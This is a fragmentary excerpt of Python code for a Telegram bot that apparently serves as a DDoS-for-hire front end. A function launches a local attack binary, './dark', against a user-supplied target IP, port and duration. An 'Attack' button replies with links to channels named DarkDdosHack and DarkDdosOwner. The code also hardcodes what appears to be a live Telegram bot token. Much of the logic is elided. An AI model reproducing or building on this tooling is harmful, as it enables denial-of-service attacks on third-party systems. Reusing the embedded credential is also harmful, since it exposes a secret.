...
TOKEN = '7110253341:AAGgvuDXZyBn3hVlJUcu9PDvHexuISa1G6E'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./dark {target_ip} {target_port} {duration}")
...
def handle_message(message):
    if message.text == "𝐀𝐭𝐭𝐚𝐜𝐤":
      #  bot.reply_to(message, "*𝐔𝐬𝐞 𝐋𝐞𝐬𝐬 𝐓𝐡𝐚𝐧 𝟑𝟎𝟎 𝐒𝐞𝐜𝐨𝐧𝐝*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "*CANARY LINK🔗: https://t.me/DarkDdosHack/88*", parse_mode='Markdown')
    elif message.text == "𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫🌟":
        bot.reply_to(message, "*https://t.me/DarkDdosOwner*", parse_mode='Markdown')
